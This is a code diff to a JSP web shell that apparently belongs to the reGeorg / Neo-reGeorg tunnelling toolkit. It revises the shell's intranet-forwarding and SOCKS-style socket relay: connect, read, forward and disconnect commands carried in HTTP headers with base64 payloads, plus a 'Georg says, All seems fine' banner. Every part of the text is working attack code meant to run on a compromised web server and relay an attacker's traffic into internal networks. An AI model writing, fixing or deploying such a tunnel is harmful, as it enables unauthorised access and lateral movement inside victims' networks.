@@ -1,4 +1,4 @@
-<%@page import="java.nio.ByteBuffer, java.nio.channels.SocketChannel, java.io.*, java.net.*, java.util.*"%>
+<%@page import="java.nio.ByteBuffer, java.nio.channels.SocketChannel, java.io.*, java.net.*, java.util.*" trimDirectiveWhitespaces="true"%>
 <%!
     private static char[] en = "BASE64 CHARSLIST".toCharArray();
     public static String b64en(byte[] data) {
@@ -80,82 +80,6 @@
         return buf.toByteArray();
     }
 
-    void puts(ServletOutputStream so, String str) throws Exception {
-        byte[] bs = str.getBytes("ISO8859-1");
-        so.write(bs, 0, bs.length);
-        so.close();
-    }
-
-    private static void redirectRequest(String urlheader, String url, HttpServletRequest request, HttpServletResponse response, ServletOutputStream so) throws Exception {
-        response.reset();
-        String method = request.getMethod();
-        URL u = new URL(url);
-        HttpURLConnection conn = (HttpURLConnection) u.openConnection();
-        conn.setRequestMethod(method);
-        conn.setDoOutput(true);
-
-        // conn.setConnectTimeout(200);
-        // conn.setReadTimeout(200);
-
-        Enumeration enu = request.getHeaderNames();
-        List<String> keys = Collections.list(enu);
-        Collections.reverse(keys);
-        for (String key : keys){
-            if (!key.equalsIgnoreCase(urlheader)){
-                String value=request.getHeader(key);
-                conn.setRequestProperty(headerkey(key), value);
-            }
-        }
-
-        int i;
-        byte[] buffer = new byte[1024];
-        if (request.getContentLength() != -1){
-            OutputStream output;
-            try{
-                output = conn.getOutputStream();
-            }catch(Exception e){
-                response.setHeader("X-ERROR", "Intranet forwarding failed");
-                return;
-            }
-
-            ServletInputStream inputStream = request.getInputStream();
-            while ((i = inputStream.read(buffer)) != -1) {
-                output.write(buffer, 0, i);
-            }
-            output.flush();
-            output.close();
-        }
-
-        for (String key : conn.getHeaderFields().keySet()) {
-            // Solve the jdk low version conn.getHeaderFields()
-            // Solve the problem of weblogic blank line cannot remove
-            if (key != null && !key.equalsIgnoreCase("Content-Length")){
-                String value = conn.getHeaderField(key);
-                response.setHeader(key, value);
-            }
-        }
-
-        InputStream hin;
-        if (conn.getResponseCode() < HttpURLConnection.HTTP_BAD_REQUEST) {
-            hin = conn.getInputStream();
-        } else {
-            hin = conn.getErrorStream();
-            if (hin == null){
-                response.setStatus(HTTPCODE);
-                return;
-            }
-        }
-
-        response.setStatus(conn.getResponseCode());
-
-        while ((i = hin.read(buffer)) != -1) {
-            so.write(buffer, 0, i);
-        }
-
-        so.flush();
-        so.close();
-    }
-
     static String headerkey(String str) throws Exception {
         String out = "";
         for (String block: str.split("-")) {
@@ -182,13 +106,77 @@
     }
 %>
 <%
-    ServletOutputStream so = response.getOutputStream();
-
     String rUrl = request.getHeader("X-REDIRECTURL");
     if (rUrl != null) {
         rUrl = new String(b64de(rUrl));
         if (!islocal(rUrl)){
-            redirectRequest("X-REDIRECTURL", rUrl, request, response, so);
+            response.reset();
+            String method = request.getMethod();
+            URL u = new URL(rUrl);
+            HttpURLConnection conn = (HttpURLConnection) u.openConnection();
+            conn.setRequestMethod(method);
+            conn.setDoOutput(true);
+
+            // conn.setConnectTimeout(200);
+            // conn.setReadTimeout(200);
+
+            Enumeration enu = request.getHeaderNames();
+            List<String> keys = Collections.list(enu);
+            Collections.reverse(keys);
+            for (String key : keys){
+                if (!key.equalsIgnoreCase("X-REDIRECTURL")){
+                    String value=request.getHeader(key);
+                    conn.setRequestProperty(headerkey(key), value);
+                }
+            }
+
+            int i;
+            byte[] buffer = new byte[1024];
+            if (request.getContentLength() != -1){
+                OutputStream output;
+                try{
+                    output = conn.getOutputStream();
+                }catch(Exception e){
+                    response.setHeader("X-ERROR", "Intranet forwarding failed");
+                    return;
+                }
+
+                ServletInputStream inputStream = request.getInputStream();
+                while ((i = inputStream.read(buffer)) != -1) {
+                    output.write(buffer, 0, i);
+                }
+                output.flush();
+                output.close();
+            }
+
+            for (String key : conn.getHeaderFields().keySet()) {
+                // Solve the jdk low version conn.getHeaderFields()
+                // Solve the problem of weblogic blank line cannot remove
+                if (key != null && !key.equalsIgnoreCase("Content-Length")){
+                    String value = conn.getHeaderField(key);
+                    response.setHeader(key, value);
+                }
+            }
+
+            InputStream hin;
+            if (conn.getResponseCode() < HttpURLConnection.HTTP_BAD_REQUEST) {
+                hin = conn.getInputStream();
+            } else {
+                hin = conn.getErrorStream();
+                if (hin == null){
+                    response.setStatus(HTTPCODE);
+                    return;
+                }
+            }
+
+            response.setStatus(conn.getResponseCode());
+
+            while ((i = hin.read(buffer)) != -1) {
+                byte[] data = new byte[i];
+                System.arraycopy(buffer, 0, data, 0, i);
+                out.write(new String(data));
+            }
+
             if ( true ) return; // exit
         }
     }
@@ -214,7 +202,6 @@
                 response.setHeader("X-ERROR", "Failed connecting to target");
                 response.setHeader("X-STATUS", "FAIL");
             }
-            puts(so, "");
         } else if (cmd.compareTo("DISCONNECT") == 0) {
             SocketChannel socketChannel = (SocketChannel)session.getAttribute(mark);
             try{
@@ -222,7 +209,6 @@
             } catch (Exception e) {
             }
             session.removeAttribute(mark);
-            puts(so, "");
         } else if (cmd.compareTo("READ") == 0){
             SocketChannel socketChannel = (SocketChannel)session.getAttribute(mark);
             try{
@@ -231,17 +217,14 @@
                 while (bytesRead > 0){
                     byte[] data = new byte[bytesRead];
                     System.arraycopy(buf.array(), 0, data, 0, bytesRead);
-                    byte[] base64 = b64en(data).getBytes();
-                    so.write(base64, 0, base64.length);
+                    out.write(b64en(data));
                     buf.clear();
                     bytesRead = socketChannel.read(buf);
                 }
-                so.close();
                 response.setHeader("X-STATUS", "OK");
 
             } catch (Exception e) {
                 response.setHeader("X-STATUS", "FAIL");
-                puts(so, "");
             }
 
         } else if (cmd.compareTo("FORWARD") == 0){
@@ -268,9 +251,8 @@
                 response.setHeader("X-STATUS", "FAIL");
                 socketChannel.socket().close();
             }
-            puts(so, "");
         }
     } else {
-        puts(so, "Georg says, 'All seems fine'");
+        out.write("Georg says, 'All seems fine'");
     }
 %>
